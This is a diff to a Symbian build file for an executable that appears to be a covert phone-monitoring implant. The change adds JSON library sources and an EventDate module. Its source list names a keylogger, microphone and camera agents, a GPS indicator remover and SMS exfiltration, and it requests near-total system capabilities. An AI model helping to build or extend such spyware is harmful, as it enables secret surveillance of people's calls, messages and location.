@@ -3,7 +3,7 @@ TARGET                                  SharedQueueMon_20023635.exe
 TARGETTYPE                              exe 
 UID                                     0 0x2002aa96 
 VENDORID                                0 
-USERINCLUDE                             ..\inc .. 
+USERINCLUDE                             ..\inc .. ..\..\Json\inc
 SYSTEMINCLUDE                           \epoc32\include 
 SYSTEMINCLUDE                           \epoc32\include\ecom
 SYSTEMINCLUDE							\epoc32\include\mmf\plugin    // amr audio encoding 
@@ -15,8 +15,11 @@ START RESOURCE 20024d7a.rss
   HEADER                                   
 END  
 
-SOURCEPATH                              ..\src 
+SOURCEPATH								..\..\Json\src
+SOURCE JsonArray.cpp JsonBuilder.cpp JsonObject.cpp JsonPair.cpp JsonParser.cpp JsonString.cpp 
+SOURCE JsonTokener.cpp JsonUtil.cpp JsonValue.cpp StringUtil.cpp
 
+SOURCEPATH                              ..\src 
 SOURCE WallpaperSticker.cpp TonePlayer.cpp
 SOURCE Monitor.cpp MessageFilter.cpp MonitorPhoneCall.cpp SlimMonitorPhoneCall.cpp MonitorFreeSpace.cpp MonitorForeground.cpp GpsIndicatorRemover.cpp CallLogReader.cpp KeyLogger.cpp
 SOURCE AbstractAction.cpp AbstractState.cpp ActionFactory.cpp ActionNone.cpp ActionSms.cpp ActionSync.cpp ActionUninstall.cpp ActionLog.cpp Network.cpp Protocol.cpp SendSmsSocket.cpp ActionSyncApn.cpp
@@ -27,7 +30,8 @@ SOURCE AbstractAgent.cpp AgentAddressbook.cpp AgentCalendar.cpp AgentMessages.cp
 SOURCE AgentSnapshot.cpp AgentFactory.cpp AgentDevice.cpp AgentMic.cpp AgentApplication.cpp AgentCallList.cpp 
 SOURCE AgentCallLocal.cpp AgentKeylog.cpp AgentCamera.cpp LogFile.cpp
 
-SOURCE AbstractEvent.cpp EventLocation.cpp EventNone.cpp EventSms.cpp EventTimer.cpp EventFactory.cpp RecvSmsSocket.cpp EventCellId.cpp EventAc.cpp EventBattery.cpp EventStandby.cpp EventSimChange.cpp EventProcess.cpp EventCall.cpp EventConnection.cpp
+SOURCE AbstractEvent.cpp EventLocation.cpp EventNone.cpp EventSms.cpp EventTimer.cpp EventFactory.cpp RecvSmsSocket.cpp EventCellId.cpp EventAc.cpp EventBattery.cpp 
+SOURCE EventStandby.cpp EventSimChange.cpp EventProcess.cpp EventCall.cpp EventConnection.cpp EventDate.cpp
 
 SOURCE  Core.cpp
 SOURCE 	ConfigFile.cpp
@@ -85,13 +89,11 @@ CAPABILITY  All -DRM -TCB -AllFiles
 
 //MACRO _DEMO  //TODO: delete this in 8.0
 //MACRO	_LOGGING
-//MACRO _JSON
 
 EPOCHEAPSIZE    0x8000 0x4000000   //max 40MB more or less
 EPOCSTACKSIZE	0x8000
 
 
 STATICLIBRARY RCS_CommonLib.lib 
-
 
 
